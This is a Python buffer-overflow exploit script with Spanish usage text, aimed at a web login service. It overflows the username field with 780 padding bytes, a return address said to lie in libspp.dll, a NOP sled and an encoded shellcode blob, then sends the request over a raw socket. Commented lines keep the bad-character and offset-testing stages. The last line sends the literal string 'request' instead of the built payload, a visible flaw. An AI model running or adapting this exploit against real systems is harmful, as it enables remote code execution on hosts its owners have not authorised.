#!/usr/bin/python3
import socket, sys

if len(sys.argv) != 3:
    print("Modo de uso: python ag_bufferoverflow.py <IP> <Port>")
    sys.exit()

target = sys.argv[1]
port = sys.argv[2]

# badchars = \x00\x0a\x0d\x25\x26\x3d
chars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = ("\xdd\xc6\xd9\x74\x24\xf4\x5e\xbd\x35\xd9\xcc\x94\x33\xc9"
"\xb1\x52\x83\xc6\x04\x31\x6e\x13\x03\x5b\xca\x2e\x61\x5f"
"\x04\x2c\x8a\x9f\xd5\x51\x02\x7a\xe4\x51\x70\x0f\x57\x62"
"\xf2\x5d\x54\x09\x56\x75\xef\x7f\x7f\x7a\x58\x35\x59\xb5"
"\x59\x66\x99\xd4\xd9\x75\xce\x36\xe3\xb5\x03\x37\x24\xab"
"\xee\x65\xfd\xa7\x5d\x99\x8a\xf2\x5d\x12\xc0\x13\xe6\xc7"
"\x91\x12\xc7\x56\xa9\x4c\xc7\x59\x7e\xe5\x4e\x41\x63\xc0"
"\x19\xfa\x57\xbe\x9b\x2a\xa6\x3f\x37\x13\x06\xb2\x49\x54"
"\xa1\x2d\x3c\xac\xd1\xd0\x47\x6b\xab\x0e\xcd\x6f\x0b\xc4"
"\x75\x4b\xad\x09\xe3\x18\xa1\xe6\x67\x46\xa6\xf9\xa4\xfd"
"\xd2\x72\x4b\xd1\x52\xc0\x68\xf5\x3f\x92\x11\xac\xe5\x75"
"\x2d\xae\x45\x29\x8b\xa5\x68\x3e\xa6\xe4\xe4\xf3\x8b\x16"
"\xf5\x9b\x9c\x65\xc7\x04\x37\xe1\x6b\xcc\x91\xf6\x8c\xe7"
"\x66\x68\x73\x08\x97\xa1\xb0\x5c\xc7\xd9\x11\xdd\x8c\x19"
"\x9d\x08\x02\x49\x31\xe3\xe3\x39\xf1\x53\x8c\x53\xfe\x8c"
"\xac\x5c\xd4\xa4\x47\xa7\xbf\x66\x83\xb3\x35\x1f\xae\xbb"
"\x48\x64\x27\x5d\x20\x8a\x6e\xf6\xdd\x33\x2b\x8c\x7c\xbb"
"\xe1\xe9\xbf\x37\x06\x0e\x71\xb0\x63\x1c\xe6\x30\x3e\x7e"
"\xa1\x4f\x94\x16\x2d\xdd\x73\xe6\x38\xfe\x2b\xb1\x6d\x30"
"\x22\x57\x80\x6b\x9c\x45\x59\xed\xe7\xcd\x86\xce\xe6\xcc"
"\x4b\x6a\xcd\xde\x95\x73\x49\x8a\x49\x22\x07\x64\x2c\x9c"
"\xe9\xde\xe6\x73\xa0\xb6\x7f\xb8\x73\xc0\x7f\x95\x05\x2c"
"\x31\x40\x50\x53\xfe\x04\x54\x2c\xe2\xb4\x9b\xe7\xa6\xd5"
"\x79\x2d\xd3\x7d\x24\xa4\x5e\xe0\xd7\x13\x9c\x1d\x54\x91"
"\x5d\xda\x44\xd0\x58\xa6\xc2\x09\x11\xb7\xa6\x2d\x86\xb8"
"\xe2")

# return_address = 0x10090c83 - libspp.dll
data = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 16 + shellcode
# data = "A" * 780 + "\x83\x0c\x09\x10" + "C" * (1200-784)
# data = "A" * 780 + "BBBB" + chars * (1200-784)

size = len(data) + len("username=&password=A")

request="POST /login HTTP/1.1\r\n"
request+="Host: "+str(target)+"\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Referer: http://"+str(target)+"/login\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(size)+"\r\n"
request+="DNT: 1\r\n"
request+="Connection: close\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+="username="+data+"&password=A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,int(port)))
s.send(b'request')